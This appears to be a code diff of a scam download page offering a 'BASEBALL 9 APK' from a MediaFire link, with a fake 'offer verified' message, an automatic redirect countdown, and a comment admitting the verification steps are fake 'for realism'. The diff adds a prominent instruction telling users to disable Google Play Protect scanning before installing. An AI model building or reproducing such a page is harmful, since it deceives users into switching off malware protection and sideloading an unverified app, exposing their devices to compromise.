@@ -64,6 +64,17 @@
             font-style: italic;
             margin: 20px 0;
         }
+        .warning-box {
+            background: rgba(255,204,0,0.1); 
+            padding: 12px; 
+            border-left: 4px solid #ffcc00; 
+            margin: 15px 0;
+        }
+        .warning-text {
+            margin: 0; 
+            font-size: 14px; 
+            color: #ffcc00;
+        }
     </style>
 </head>
 <body>
@@ -71,12 +82,18 @@
         <h1>🎉 DOWNLOAD READY! 🎉</h1>
         <p class="verification">✓ Offer verified successfully</p>
         
+        <div class="warning-box">
+            <p class="warning-text">
+               ⚠️ <strong>Important:</strong> To install, go to <strong>Settings → Google Play Protect → Disable</strong> scanning.
+            </p>
+        </div>
+
         <div class="loader"></div>
-        
+
         <p>Your <strong>BASEBALL 9 APK</strong> will download in <span id="countdown">5</span> seconds...</p>
         <p><small>If the download doesn't start automatically:</small></p>
         <a href="https://www.mediafire.com/file/l6oh079mfrjhb7j/BASEBALL_9_v3.6.9.apk/file" class="btn">CLICK TO DOWNLOAD NOW</a>
-        
+
         <p style="margin-top: 30px; font-size: 12px; opacity: 0.7;">
             By downloading, you agree to our Terms of Service.
         </p>
@@ -86,17 +103,17 @@
         // Countdown with verification animation
         let seconds = 5;
         const countdownEl = document.getElementById("countdown");
-        
+
         const timer = setInterval(() => {
             seconds--;
             countdownEl.textContent = seconds;
-            
+
             if (seconds <= 0) {
                 clearInterval(timer);
                 window.location.href = "https://www.mediafire.com/file/l6oh079mfrjhb7j/BASEBALL_9_v3.6.9.apk/file";
             }
         }, 1000);
-        
+
         // Fake verification steps (adds realism)
         setTimeout(() => {
             document.querySelector('.verification').textContent = "✓ Finalizing download package...";
@@ -104,12 +121,3 @@
     </script>
 </body>
 </html>
-<p class="verification">✓ Offer verified successfully</p>
-
-<div style="background:rgba(255,204,0,0.1); padding:12px; border-left:4px solid #ffcc00; margin:15px 0;">
-   <p style="margin:0; font-size:14px; color:#ffcc00;">
-      ⚠️ <strong>Important:</strong> To install, go to <strong>Settings → Google Play Protect → Disable</strong> scanning.
-   </p>
-</div>
-
-<div class="loader"></div>
